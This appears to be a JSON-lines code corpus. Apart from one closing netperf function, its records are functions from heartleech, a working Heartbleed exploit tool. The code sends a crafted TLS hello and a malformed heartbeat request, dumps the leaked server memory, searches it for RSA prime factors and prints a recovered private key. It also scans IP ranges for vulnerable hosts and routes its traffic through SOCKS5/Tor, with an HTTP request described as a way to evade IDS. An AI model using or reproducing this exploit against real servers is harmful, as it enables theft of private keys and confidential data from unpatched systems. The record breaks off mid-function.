(dg_stream_request->measure_cpu) {\n    dg_stream_results->cpu_util\t= calc_cpu_util(elapsed_time);\n  }\n  else {\n    dg_stream_results->cpu_util\t= -1.0;\n  }\n\n  if (debug > 1) {\n    fprintf(where,\n\t    \"recv_dg_stream: test complete, sending results.\\n\");\n    fflush(where);\n  }\n\n  send_response();\n\n}", "path": "netperf/src/nettest_unix.c", "commit_date": "2015-10-30 00:00:00", "repo_name": "HewlettPackard/netperf", "stars": 814, "license": "mit", "language": "c", "size": 15948}
{"docstring": "/******************************************************************************\n * After reading a chunk of data, this function will process that chunk.\n * There are three things we might do with that data:\n *  1. save to a file for later offline processing\n *  2. search for private key\n *  3. hexdump to the command-line\n ******************************************************************************/\n", "func_signal": "static size_t\nprocess_bleed(const struct DumpArgs *args_in,\n              const unsigned char *buf, size_t buf_size,\n              BIGNUM n, BIGNUM e)", "code": "{\n    struct DumpArgs *args = (struct DumpArgs*)args_in;\n    size_t x;\n\n    /* ignore empty chunks */\n    if (buf_size == 0)\n        return 0;\n    \n    pthread_mutex_lock(&args->mutex);\n\n    /* track total bytes processed, for printing to the command-line */\n    args->total_bytes += buf_size;\n\n    /* write a copy of the bleeding data to a file for offline processing\n     * by other tools */\n    if (args->fp) {\n        x = fwrite(buf, 1, buf_size, args->fp);\n        if (x != buf_size) {\n            ERROR_MSG(\"[-] %s: %s\\n\", args->dump_filename, strerror(errno));\n        }\n    }\n\n    /* do a live analysis of the bleeding data */\n    if (args->is_auto_pwn) {\n        if (find_private_key(n, e, buf, buf_size)) {\n            ; //printf(\"key found!\\n\");\n            //exit(1);\n        }\n\n    }\n\n    pthread_mutex_unlock(&args->mutex);\n\n    return buf_size;\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Retrieves a target from the list of targets\n ******************************************************************************/\n", "func_signal": "struct Target\ntarget_get(const struct DumpArgs *cargs)", "code": "{\n    struct DumpArgs *args = (struct DumpArgs *)cargs;\n    struct Target result;\n    \n    memset(&result, 0, sizeof(result));\n\n    /*\n     * Remove the target from the list\n     */\n    pthread_mutex_lock(&args->mutex);\n    if (args->targets.count) {\n        args->targets.count--;\n        result = args->targets.list[args->targets.count];\n    }\n    pthread_mutex_unlock(&args->mutex);\n    \n    /*\n     * Do some initialization on optional fields\n     */\n    BN_init(&result.n);\n    BN_init(&result.e);\n    result.loop.desired = args->cfg_loopcount;\n    if (result.port > 65535)\n        result.port = args->default_port;\n\n    return result;\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Used in text-based protocols like SMTP, FTP, POP3, and IMAP to receive\n * the next line of text.\n ******************************************************************************/\n", "func_signal": "static int\nrecv_line(  int fd,\n            unsigned char *line, unsigned *offset, unsigned max,\n            unsigned timeout)", "code": "{\n    time_t start_time = time(0);\n    size_t len;\n\n    for (;;) {\n        char c;\n\n        /* wait for incoming data */\n        while (!is_incoming_data(fd)) {\n            if (start_time + timeout < time(0)) {\n                ERROR_MSG(\"[-] starttls handshake: timed out\\n\");\n                return -1;\n            }\n        }\n\n        /* grab the next character */\n        len = recv(fd, &c, 1, 0);\n        if (len == 0) {\n            if (start_time + timeout < time(0)) {\n                ERROR_MSG(\"[-] starttls handshake: network error\\n\");\n                return -1;\n            }\n        }\n\n        /* append to the line */\n        if (*offset < max) {\n            line[(*offset)++] = c;\n        }\n\n        /* quit at end of line */\n        if (c == '\\n')\n            break;\n    }\n\n    return 0;\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Wrapper function for printing addresses, since the standard\n * \"inet_ntop()\" function doesn't automatically grab the 'family' from\n * the socket structure to begin with\n ******************************************************************************/\n", "func_signal": "static const char *\nmy_inet_ntop(struct sockaddr *sa, char *dst, size_t sizeof_dst)", "code": "{\n#if defined(WIN32)\n    /* WinXP doesn't have 'inet_ntop()', but it does have another WinSock\n     * function that takes care of this for us */\n    {\n        DWORD len = (DWORD)sizeof_dst;\n        WSAAddressToStringA(sa, sizeof(struct sockaddr_in6), NULL,\n                            dst, &len);\n    }\n#else\n    switch (sa->sa_family) {\n    case AF_INET:\n        inet_ntop(AF_INET, &(((struct sockaddr_in *)sa)->sin_addr),\n                dst, sizeof_dst);\n        break;\n    case AF_INET6:\n        inet_ntop(AF_INET6, &(((struct sockaddr_in6 *)sa)->sin6_addr),\n                dst, sizeof_dst);\n        break;\n    default:\n        dst[0] = '\\0';\n    }\n#endif\n    return dst;\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Process the files produced by this tool, or other tools, looking for\n * the private key in the given certificate.\n ******************************************************************************/\n", "func_signal": "static void\nprocess_offline_file(const struct DumpArgs *args,\n                        const char *filename_cert, const char *filename_bin)", "code": "{\n    FILE *fp;\n    X509 *cert;\n    char name[512];\n    BIGNUM n;\n    BIGNUM e;\n    unsigned long long offset = 0;\n    unsigned long long last_offset = 0;\n\n    /*\n     * Read in certificate\n     */\n    if (filename_cert) {\n        fp = fopen(filename_cert, \"rb\");\n        if (fp == NULL) {\n            perror(filename_cert);\n            return;\n        }\n        cert = PEM_read_X509(fp, NULL, NULL, NULL);\n        if (cert == NULL) {\n            fprintf(stderr, \"%s: error parsing certificate\\n\", filename_cert);\n            fclose(fp);\n            return;\n        }\n        fclose(fp);\n        parse_cert(cert, name, &n, &e);\n    }\n\n    /*\n     * Read in the file to process\n     */\n    fp = fopen(filename_bin, \"rb\");\n    if (fp == NULL) {\n        perror(filename_bin);\n        goto end;\n    }\n    while (!feof(fp)) {\n        unsigned char buf[65536 + 18];\n        size_t bytes_read;\n\n        bytes_read = fread(buf, 1, sizeof(buf), fp);\n        if (bytes_read == 0)\n            break;\n\n        if (args->patterns.count) {\n            scan_patterns(args, buf, bytes_read);\n        }\n\n        if (filename_cert) {\n            if (find_private_key(n, e, buf, bytes_read)) {\n                fprintf(stderr, \"found: offset=%llu\\n\", offset);\n                exit(1);\n            }\n        }\n\n        offset += bytes_read;\n\n        if (offset > last_offset + 1024*1024) {\n            printf(\"%llu bytes read          \\r\", offset);\n            last_offset = offset;\n        }\n    }\n    fclose(fp);\n\n\n\n    end:\n    X509_free(cert);\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Scan/dump a list of targets.\n *\n * Sadly, this is non-cohesive task, where we may be scanning or dumping\n * depending upon command-line line flags. A \"scan\" stops interacting with\n * a host once it's found it's verdict, whereas a \"dump\" continues grabbing\n * data, looping around and reconnecting to the target.\n ******************************************************************************/\n", "func_signal": "static void\nrun_scan(const struct DumpArgs *args)", "code": "{\n\n    while (args->targets.count) {\n        struct Target target;\n        unsigned is_starttls = 0;\n\n        /*\n         * Remove the next target to be processed in a thread-safe manner\n         */\n        target = target_get(args);\n\n        \n        /* Figure out the application-layer information. This is used for \n         * two purposes. The first is in the case of \"STARTTL\" negotiating\n         * that must happen in certain protocols (like SMTP, POP3, etc.)\n         * before SSL happens. The second is for operations to keep the \n         * connection open after the handshake is over, such as HTTP GET\n         * or SMTP NOOP. */\n        target.application = port_to_app(target.port, &is_starttls);\n        if (is_starttls)\n            target.starttls = target.application;\n\n        /* If doing HTTP, then we need to format an HTTP request in order to\n         * keep the connection open and to evade IDS. This request will set\n         * the \"host\" field appropriately in the request */\n        if (target.application == APP_HTTP)\n            target.http_request = initialize_http(&target);\n\n        /*\n         * Continue creating connections to the target until we are done.\n         * Note that multiple heartbleeds may be done per connection.\n         */\n        while (target.loop.done < target.loop.desired) {\n            int x;\n            x = ssl_thread(args, &target);\n            if (x < 0)\n                break;\n        }\n\n        /*\n         * Print verdict, if doing a \"scan\". If doing a \"dump\", this won't\n         * be printed.\n         */\n        if (args->is_scan) {\n            switch (target.scan_result) {\n                case Verdict_Safe:\n                    printf(\"%s:%u: SAFE\\n\",\n                           target.hostname, target.port);\n                    break;\n                case Verdict_Vulnerable:\n                    printf(\"%s:%u: VULNERABLE\\n\",\n                           target.hostname, target.port);\n                    break;\n                case Verdict_Inconclusive_NoDNS:\n                    printf(\"%s:%u: INCONCLUSIVE: DNS failed\\n\",\n                           target.hostname, target.port);\n                    break;\n                case Verdict_Inconclusive_NoTcp:\n                    printf(\"%s:%u: INCONCLUSIVE: TCP connect failed\\n\",\n                           target.hostname, target.port);\n                    break;\n                case Verdict_Inconclusive_NoSsl:\n                    printf(\"%s:%u: INCONCLUSIVE: SSL handshake failed\\n\",\n                           target.hostname, target.port);\n                    break;\n                default:\n                    printf(\"%s:%u: INCONCLUSIVE\\n\",\n                           target.hostname, target.port);\n                    break;\n            }\n        }\n\n        /*\n         * Free the resources used by the target\n         */\n        target_free(&target);\n    }\n\n    /* We did a sync_add() to this variable before launching this thread,\n     * and now we do a sync_sub() to indicate that the thread is done.\n     * The master thread waits for this count to go to zero before\n     * it exits the program */\n    __sync_fetch_and_sub(&((struct DumpArgs*)args)->threads.running, 1);\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Add a target to our list, when scanning multiple targets\n ******************************************************************************/\n", "func_signal": "static void\ntarget_add(struct TargetList *targets, const char *hostname)", "code": "{\n    unsigned port_index;\n    unsigned host_index = 0;\n    unsigned host_length;\n    unsigned range_index;\n    unsigned range_length;\n\n    \n    /*\n     * parse for port info \n     */\n    if (hostname[0] == '[' && strchr(hostname, ']')) {\n        port_index = strchr(hostname, ']') - hostname;\n        host_index = 1;\n    } else if (strrchr(hostname, ':'))\n        port_index = strrchr(hostname, ':') - hostname;\n    else\n        port_index = strlen(hostname);\n    host_length = port_index - host_index;\n    \n\n    /*\n     * Parse for range\n     */\n    x_split(hostname, host_index, host_length,\n            &host_index, &host_length,\n            &range_index, &range_length);\n\n\n    /*\n     * Add target\n     * - either this name/IPv4/IPv6 address\n     * - or this IPv4-IPv4 range\n     */\n    if (host_index == range_index) {\n        target_add2(targets, hostname, host_index, host_length, hostname, port_index);\n    } else {\n        size_t n;\n        char *host1 = malloc(host_length+1);\n        char *host2 = malloc(range_length+1);\n        unsigned char foo[16];\n        unsigned char type = 0;\n        unsigned ip_start;\n        unsigned ip_stop;\n        \n        memcpy(host1, hostname+host_index, host_length);\n        host1[host_length] = '\\0';\n        memcpy(host2, hostname+range_index, range_length);\n        host2[range_length] = '\\0';\n        \n        n = my_inet_pton(host1, foo, 0, sizeof(foo), &type);\n        if (type != 1) {\n            fprintf(stderr, \"[-] bad range spec: %s\\n\", hostname);\n            exit(1);\n        }\n        ip_start = foo[0]<<24 | foo[1]<<16 | foo[2]<<8 | foo[3];\n        type = 0;\n\n        n = my_inet_pton(host2, foo, 0, sizeof(foo), &type);\n        if (type != 1) {\n            fprintf(stderr, \"[-] bad range spec: %s\\n\", hostname);\n            exit(1);\n        }\n        ip_stop = foo[0]<<24 | foo[1]<<16 | foo[2]<<8 | foo[3];\n\n\n        while (ip_start <= ip_stop) {\n            char host2[32];\n            snprintf(host2, sizeof(host2), \"%u.%u.%u.%u\",\n                (ip_start>>24)&0xFF,\n                (ip_start>>16)&0xFF,\n                (ip_start>> 8)&0xFF,\n                (ip_start>> 0)&0xFF);\n            target_add2(targets, host2, 0, strlen(host2), hostname, port_index);\n            ip_start++;\n        }\n    }\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Do the raw TCP connection, before the handshake has completed\n ******************************************************************************/\n", "func_signal": "static int\nssl_thread_raw(int fd, const struct DumpArgs *args, struct Target *target,\n                struct Connection *connection)", "code": "{\n    static const char client_hello[] = \n        \"\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xfc\\x03\\x03\\x92\\x2b\\xa1\\xe5\\x46\"\n        \"\\x09\\x59\\x03\\xcc\\xf2\\x6a\\xd7\\x4c\\xc8\\xb9\\xd3\\x72\\x35\\xcb\\xf6\\x0b\"\n        \"\\x92\\xe3\\xcd\\x30\\x6c\\x9a\\x67\\x84\\x49\\x00\\x82\\x00\\x00\\xa0\\xc0\\x30\"\n        \"\\xc0\\x2c\\xc0\\x28\\xc0\\x24\\xc0\\x14\\xc0\\x0a\\xc0\\x22\\xc0\\x21\\x00\\xa3\"\n        \"\\x00\\x9f\\x00\\x6b\\x00\\x6a\\x00\\x39\\x00\\x38\\x00\\x88\\x00\\x87\\xc0\\x32\"\n        \"\\xc0\\x2e\\xc0\\x2a\\xc0\\x26\\xc0\\x0f\\xc0\\x05\\x00\\x9d\\x00\\x3d\\x00\\x35\"\n        \"\\x00\\x84\\xc0\\x12\\xc0\\x08\\xc0\\x1c\\xc0\\x1b\\x00\\x16\\x00\\x13\\xc0\\x0d\"\n        \"\\xc0\\x03\\x00\\x0a\\xc0\\x2f\\xc0\\x2b\\xc0\\x27\\xc0\\x23\\xc0\\x13\\xc0\\x09\"\n        \"\\xc0\\x1f\\xc0\\x1e\\x00\\xa2\\x00\\x9e\\x00\\x67\\x00\\x40\\x00\\x33\\x00\\x32\"\n        \"\\x00\\x9a\\x00\\x99\\x00\\x45\\x00\\x44\\xc0\\x31\\xc0\\x2d\\xc0\\x29\\xc0\\x25\"\n        \"\\xc0\\x0e\\xc0\\x04\\x00\\x9c\\x00\\x3c\\x00\\x2f\\x00\\x96\\x00\\x41\\x00\\x07\"\n        \"\\xc0\\x11\\xc0\\x07\\xc0\\x0c\\xc0\\x02\\x00\\x05\\x00\\x04\\x00\\x15\\x00\\x12\"\n        \"\\x00\\x09\\x00\\x14\\x00\\x11\\x00\\x08\\x00\\x06\\x00\\x03\\x00\\xff\\x01\\x00\"\n        \"\\x01\\x33\\x00\\x0b\\x00\\x04\\x03\\x00\\x01\\x02\\x00\\x0a\\x00\\x34\\x00\\x32\"\n        \"\\x00\\x0e\\x00\\x0d\\x00\\x19\\x00\\x0b\\x00\\x0c\\x00\\x18\\x00\\x09\\x00\\x0a\"\n        \"\\x00\\x16\\x00\\x17\\x00\\x08\\x00\\x06\\x00\\x07\\x00\\x14\\x00\\x15\\x00\\x04\"\n        \"\\x00\\x05\\x00\\x12\\x00\\x13\\x00\\x01\\x00\\x02\\x00\\x03\\x00\\x0f\\x00\\x10\"\n        \"\\x00\\x11\\x00\\x23\\x00\\x00\\x00\\x0d\\x00\\x20\\x00\\x1e\\x06\\x01\\x06\\x02\"\n        \"\\x06\\x03\\x05\\x01\\x05\\x02\\x05\\x03\\x04\\x01\\x04\\x02\\x04\\x03\\x03\\x01\"\n        \"\\x03\\x02\\x03\\x03\\x02\\x01\\x02\\x02\\x02\\x03\\x00\\x0f\\x00\\x01\\x01\\x00\"\n        \"\\x15\\x00\\xc2\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        \"\\x00\\x00\\x00\\x00\\x00\";\n    int x;\n    time_t start_time;\n    unsigned char buf[16384];\n    size_t buf_size;\n    size_t offset;\n    struct SSL_RECORD rec;\n    unsigned is_fail = 0;\n\n    memset(&rec, 0, sizeof(rec));\n\n    /*\n     * Send the client hello\n     */\n    x = send(fd, client_hello, sizeof(client_hello)-1, MSG_NOSIGNAL);\n    if (x < 3) {\n        ERROR_MSG(\"[-] raw handshake: %s (%u)\\n\",\n            error_msg(WSAGetLastError()), WSAGetLastError());\n        return -1;\n    }\n\n    /*\n     * Wait for the server response\n     */\n    for (;;) {\n        start_time = time(0);\n        while (!is_incoming_data(fd)) {\n            if (start_time + args->timeout < time(0)) {\n                ERROR_MSG(\"[-] raw handshake: timed out\\n\");\n                return -1;\n            }\n        }\n        buf_size = recv(fd, (char*)buf, sizeof(buf), 0);\n        if (buf_size == 0) {\n            ERROR_MSG(\"[-] raw handshake: %s (%u)\\n\",\n                error_msg(WSAGetLastError()), WSAGetLastError());\n            return -1;\n        }\n\n        /*\n         * Parse the response\n         */\n        offset = 0;\n        x = raw_parse_ssl(&rec, buf, &offset, buf_size, connection);\n        if (x == -1) {\n            ERROR_MSG(\"[-] raw handshake: parse error\\n\");\n            return -1;\n        }\n        if (rec.state == 0)\n            break;\n    }\n\n\n    /*\n     * Send heartbeat request\n     */\n    rec.heartbleed.state = 0;\n//resend:\n    x = send(fd, \"\\x18\\x03\\x01\\x00\\x03\"\n                 \"\\x01\\x40\\x00\", 8, MSG_NOSIGNAL);\n    if (x < 3) {\n        ERROR_MSG(\"[-] raw handshake: %s (%u)\\n\",\n            error_msg(WSAGetLastError()), WSAGetLastError());\n        return -1;\n    }\n    rec.heartbleed.is_heartbleed_received = 0;\n\n    print_status(args);\n\n    /*\n     * Parse remaining data\n     */\n    while (!rec.heartbleed.is_heartbleed_received) {\n        if (offset >= buf_size) {\n            start_time = time(0);\n            while (!is_incoming_data(fd)) {\n                if (start_time + args->timeout < time(0)) {\n                    ERROR_MSG(\"[-] raw handshake: timed out\\n\");\n                    goto fail;\n                }\n            }\n            buf_size = recv(fd, (char*)buf, sizeof(buf), 0);\n            if (buf_size == 0) {\n                ERROR_MSG(\"[-] raw handshake: %s (%u)\\n\",\n                    error_msg(WSAGetLastError()), WSAGetLastError());\n                goto fail;\n            }\n            offset = 0;\n        }\n\n        /*\n         * Parse the response\n         */\n        while (offset < buf_size) {\n            x = raw_parse_ssl(&rec, buf, &offset, buf_size, connection);\n            if (x == -1) {\n                ERROR_MSG(\"[-] raw handshake: parse error\\n\");\n                return -1;\n            }\n        }\n    }\n\n    goto end;\n\nfail:\n    is_fail = 1;\nend:\n    if (connection->buf2_count) {\n        DEBUG_MSG(\"[+] received %u bytes of heartbleed\\n\", connection->buf2_count);\n        process_bleed(args, connection->buf2, connection->buf2_count,\n                        target->n, target->e);\n        connection_buf_init(connection);\n    }\n\n    //if (!is_fail)\n     //   goto resend;\n\n    return 0;\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Translate sockets error codes to helpful text for printing\n ******************************************************************************/\n", "func_signal": "static const char *\nerror_msg(unsigned err)", "code": "{\n    switch (err) {\n    case WSA(ECONNRESET): return \"TCP connection reset\";\n    case WSA(ECONNREFUSED): return \"Connection refused\";\n    case WSA(ETIMEDOUT): return \"Timed out\";\n    case WSA(ECONNABORTED): return \"Connection aborted\";\n    case 0: return \"TCP connection closed\";\n    default:   return \"network error\";\n    }\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * This is the \"callback\" that receives the hearbeat data. Since\n * hearbeat is a control function and not part of the normal data stream\n * it can't be read normally. Instead, we have to install a hook within\n * the OpenSSL core to intercept them.\n ******************************************************************************/\n", "func_signal": "static void\nreceive_heartbeat(int write_p, int version, int content_type,\n            const void *vbuf, size_t len, SSL *ssl,\n            void *arg)", "code": "{\n    struct Connection *connection = (struct Connection *)arg;\n    struct Target * target = connection->target;\n    const struct DumpArgs *args = connection->args;\n    const unsigned char *buf = (const unsigned char *)vbuf;\n\n    /*\n     * Ignore anything that isn't a \"hearbeat\". This function hooks\n     * every OpenSSL-internal message, but we only care about\n     * the hearbeats.\n     */\n    switch (content_type) {\n    case SSL3_RT_CHANGE_CIPHER_SPEC: /* 20 */\n    case SSL3_RT_HANDSHAKE: /* 22 */\n    case SSL3_RT_APPLICATION_DATA: /* 23 */\n    case 256: /* ???? why this? */\n        return;\n    case SSL3_RT_ALERT: /* 21 */\n        if (buf[0] == 2) {\n            DEBUG_MSG(\"[-] ALERT fatal %u len=%u\\n\", buf[1], len);\n        } else {\n            switch (buf[1]) {\n                case SSL3_AD_CLOSE_NOTIFY:\n                    DEBUG_MSG(\"[-] ALERT warning: connection closing\\n\");\n                    break;\n                default:\n                    DEBUG_MSG(\"[-] ALERT warning %u len=%u\\n\", buf[1], len);\n                    break;\n            }\n        }\n        connection->is_alert = 1;\n        return;\n    case TLS1_RT_HEARTBEAT:\n        break; /* handle below */\n    default:\n        ERROR_MSG(\"[-] msg_callback:%u: unknown type seen\\n\", content_type);\n        return;\n    }\n\n    /* Record how many bytes we've received, so that we can known when we've\n     * received all the heartbeat */\n    connection->event.bytes_received += len;\n\n    /*\n     * See if this is a \"good\" heartbeat, which we send to probe\n     * the system in order to see if it's been patched.\n     */\n    if (connection->is_sent_good_heartbeat && len < 60) {\n        static const char *good_response =\n            \"\\x02\\x00\\x12\"\n            \"aaaaaaaaaaaaaaaa\"\n            \"aaaaaaaaaaaaaaaa\"\n            \"aaaaaaaaaaaaaaaa\"\n            ;\n        if (memcmp(buf, good_response, 0x12+3) == 0) {\n            ERROR_MSG(\"[-] PATCHED: heartBEAT received, but not BLEED\\n\");\n            connection->heartbleeds.failed++;\n            target->scan_result = Verdict_Safe;\n            return;\n        }\n    }\n\n    /*\n     * Inform user that we got some bleeding data\n     */\n    DEBUG_MSG(\"[+] %5u-bytes bleed received\\n\", (unsigned)len);\n\n    /*\n     * Copy this to the buffer\n     */\n    connection_buf_append(connection, buf, len);\n\n    /*\n     * Display bytes if not dumping to file\n     */\n    if (!args->fp && is_debug && !args->is_scan) {\n        hexdump(buf, len);\n    }\n\n    /* Count this, to verify that bleeds are working */\n    connection->heartbleeds.succeeded++;\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * This function searches a buffer looking for a prime that is a factor\n * of the public key\n ******************************************************************************/\n", "func_signal": "static int\nfind_private_key(const BIGNUM n, const BIGNUM e,\n                 const unsigned char *buf, size_t buf_length)", "code": "{\n    size_t i;\n    int prime_length = n.top * sizeof(BN_ULONG);\n    BN_CTX *ctx;\n    BIGNUM p;\n    BIGNUM q;\n    BIGNUM remainder;\n\n    BN_init(&q);\n    BN_init(&remainder);\n    BN_init(&p);\n\n    /* Need enough target data to hold at least one prime number */\n    if (buf_length < (size_t)prime_length)\n        return 0;\n\n    ctx = BN_CTX_new();\n\n    /* Go forward one byte at a time through the buffer */\n    for (i=0; i<buf_length-prime_length; i++) {\n\n        /* Grab a possible little-endian prime number from the buffer.\n         * [NOTE] this assumes the target machine and this machine have\n         * roughly the same CPU (i.e. x86). If the target machine is\n         * a big-endian SPARC, but this machine is a little endian x86,\n         * then this technique won't work.*/\n        p.d = (BN_ULONG*)(buf+i);\n        p.dmax = n.top/2;\n        p.top = p.dmax;\n\n        /* [optimization] Only process odd numbers, because even numbers\n         * aren't prime. This doubles the speed. */\n        if (!(p.d[0]&1))\n            continue;\n\n        /* [optimization] Make sure the top bits aren't zero. Firstly,\n         * this won't be true for the large primes in question. Secondly,\n         * a lot of bytes in dumps are zeroed out, causing this condition\n         * to be true a lot. Not only does this quickly weed out target\n         * primes, it takes BN_div() a very long time to divide when\n         * numbers have leading zeroes\n         */\n        if (p.d[p.top-1] == 0)\n            continue;\n\n        /* Do the division, grabbing the remainder */\n        BN_div(&q, &remainder, &n, &p, ctx);\n        if (!BN_is_zero(&remainder))\n            continue;\n\n        /* We have a match! Let's create an X509 certificate from this */\n        {\n            RSA *rsa;\n            BIO *out = BIO_new(BIO_s_file());\n\n            fprintf(stderr, \"\\n\");\n            BIO_set_fp(out,stdout,BIO_NOCLOSE);\n\n            rsa = rsa_gen(&p, &q, &e);\n            PEM_write_bio_RSAPrivateKey(out, rsa, NULL, NULL, 0, NULL, NULL);\n\n            /* the program doesn't need to continue */\n            exit(0);\n        }\n    }\n\n    BN_free(&q);\n    BN_free(&remainder);\n    BN_CTX_free(ctx);\n\n    return 0;\n}", "path": "heartleech/heartleech.c", "commit_date": "2014-06-06 00:00:00", "repo_name": "robertdavidgraham/heartleech", "stars": 695, "license": "agpl-3.0", "language": "c", "size": 9938}
{"docstring": "/******************************************************************************\n * Does the proxy connection. Currently, we only support Socks5n for\n * use with Tor\n ******************************************************************************/\n", "func_signal": "static int\nproxy_handshake(int fd,\n                const struct DumpArgs *args, const struct Target *target)", "code": "{\n    unsigned char foo[512];\n    unsigned offset;\n    char proxy_address[300] = \"\";\n    unsigned proxy_port = 0;\n    time_t start_time;\n    int x;\n\n    /*\n     * negotiate version=5, passwords=none\n     */\n    x = send(fd, \"\\x05\\x01\\x00\", 3, MSG_NOSIGNAL);\n    if (x < 3) {\n        ERROR_MSG(\"[-] proxy handshake: %s (%u)\\n\",\n            error_msg(WSAGetLastError()), WSAGetLastError());\n        return -1;\n    }\n\n    /*\n     * read the negotiated response\n     */\n    start_time = time(0);\n    while (!is_incoming_data(fd)) {\n        if (start_time + args->timeout < time(0)) {\n            ERROR_MSG(\"[-] proxy handshake: timed out\\n\");\n            return -1;\n        }\n    }\n    x = recv(fd, (char*)foo, 2, 0);\n    if (x != 2) {\n        ERROR_MSG(\"[-] proxy handshake: %s (%u)\\n\",\n            error_msg(WSAGetLastError()), WSAGetLastError());\n        return -1;\n    }\n\n    /*\n     * Parse the response negotiation\n     */\n    if (foo[0] != 5) {\n        ERROR_MSG(\"[-] proxy handshake: not Socks5\\n\");\n        return -1;\n    }\n    if (foo[1] != 0) {\n        ERROR_MSG(\"[-] proxy handshake: requires authentication\\n\");\n        return -1;\n    }\n\n    /*\n     * send connect requrest\n     */\n    foo[0] = 5; /*version = socks5 */\n    foo[1] = 1; /*cmd = connect*/\n    foo[2] = 0; /*reserved*/\n    offset = my_inet_pton(target->hostname, foo, 4, sizeof(foo), &foo[3]);\n    if (offset + 2 < sizeof(foo)) {\n        foo[offset++] = (unsigned char)(target->port>>8);\n        foo[offset++] = (unsigned char)(target->port>>0);\n    }\n    x = send(fd, (char*)foo, offset, MSG_NOSIGNAL);\n    if (x != offset) {\n        ERROR_MSG(\"[-] proxied connect: %s (%u)\\n\",\n            error_msg(WSAGetLastError()), WSAGetLastError());\n        return -1;\n    }\n\n    /*\n     * Now check the reply to see if we've succeeded\n     */\n    start_time = time(0);\n    while (!is_incoming_data(fd)) {\n        if (start_time + args->timeout < time(0)) {\n            ERROR_MSG(\"[-] proxied connect: timed out\\n\");\n            return -1;\n        }\n    }\n    x = recv(fd, (char*)foo, sizeof(foo), 0);\n    if (x == 0) {\n        ERROR_MSG(\"[-] proxied connect: %s (%u)\\n\",\n            error_msg(WSAGetLastError()), WSAGetLastError());\n        return -1;\n    }\n\n    /*\n     * Parse the response\n     */\n    if (foo[0] != 5) {\n        ERROR_MSG(\"[-] proxied connect: corrupted result\\n\");\n        return -1;\n    }\n    if (foo[1]) {\n        switch (foo[1]) {\n        case 0: break;\n        case 1: ERROR_MSG(\"[-] proxy error: general failure\\n\"); break;\n        case 2: ERROR_MSG(\"[-] proxy error: firewalled\\n\"); break;\n        case 3: ERROR_MSG(\"[-] proxy error: net unreachable\\n\"); break;\n        case 4: ERROR_MSG(\"[-] proxy error: host unreachable\\n\"); break;\n        case 5: ERROR_MSG(\"[-] proxy error: connection refused\\n\"); break;\n        case 6: ERROR_MSG(\"[-] proxy error: TTL expired\\n\"); break;\n        case 7: ERROR_MSG(\"[-] proxy error: command not supported\\n\"); break;\n        case 8: ERROR_MSG(\"[-] proxy error: IPv6 not supported\\n\"); break;\n        default: ERROR_MSG(\"[-] proxy error: unknown error\\n\"); break;\n        }\n        return -1;\n    }\n\n    switch (foo[3]) {\n  